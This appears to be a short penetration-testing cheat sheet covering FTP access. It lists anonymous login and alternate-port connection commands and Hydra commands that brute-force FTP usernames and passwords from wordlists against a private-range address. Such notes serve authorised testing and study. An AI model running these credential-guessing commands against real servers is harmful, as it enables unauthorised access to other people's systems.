With no creds:
- `ftp anonymous@192.168.100.101`

To an alternate port:
- `ftp $user@$IP $port`


### Hydra
With a username:
 `hydra -L usernames.txt -P passwords.txt 192.168.100.101 ftp`

- `hydra -l $user -P passwords.txt 192.168.100.101 ftp`

With a password:
- `hydra -L usernames.txt -p $password 192.168.100.101 ftp`

